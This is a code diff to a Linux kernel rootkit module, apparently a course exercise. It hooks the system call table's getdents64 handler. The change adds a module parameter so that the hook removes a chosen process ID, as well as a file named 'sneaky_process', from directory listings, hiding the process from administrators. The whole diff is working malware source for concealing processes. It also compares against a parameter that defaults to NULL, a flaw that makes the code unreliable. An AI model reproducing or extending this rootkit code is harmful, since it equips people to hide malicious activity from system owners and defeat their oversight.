@@ -24,6 +24,9 @@ struct linux_dirent64 {
 //This is a pointer to the system call table
 static unsigned long * sys_call_table;
 
+char * sneaky_pid = NULL;
+module_param(sneaky_pid, charp, 0);
+
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
 int enable_page_rw(void * ptr) {
@@ -56,9 +59,9 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
 asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 
 asmlinkage int sneaky_getdents64(struct pt_regs * regs) {
-  // printk(KERN_INFO "get sneaky getdents64");
   unsigned long entryDirent = regs->si;
   int nread = (*original_getdents64)(regs), off = 0;
+  printk(KERN_INFO "get sneaky getdents64 with process id %s", sneaky_pid);
 
   if (nread == 0 || nread < 0) {
     return 0;  // == 0 means nothing to read, and < 0 means error
@@ -66,7 +69,8 @@ asmlinkage int sneaky_getdents64(struct pt_regs * regs) {
 
   for (off = 0; off < nread;) {
     struct linux_dirent64 * curDirent = (struct linux_dirent64 *)(entryDirent + off);
-    if (strcmp(curDirent->d_name, "sneaky_process") == 0) {
+    if (strcmp(curDirent->d_name, "sneaky_process") == 0 ||
+        strcmp(curDirent->d_name, sneaky_pid) == 0) {
       void * nextDirent = (void *)curDirent + curDirent->d_reclen;
       int remaining_size = nread - (off + curDirent->d_reclen);
       memmove(curDirent, nextDirent, remaining_size);
